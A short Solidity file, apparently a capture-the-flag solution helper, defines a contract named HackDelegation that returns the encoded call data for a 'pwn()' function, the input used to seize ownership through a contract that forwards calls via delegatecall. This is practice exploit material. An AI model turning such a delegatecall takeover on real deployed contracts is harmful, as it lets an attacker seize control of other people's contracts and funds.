// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackDelegation {
     function getsig () public pure returns (bytes memory) {
      return abi.encodeWithSignature("pwn()");
    }
}
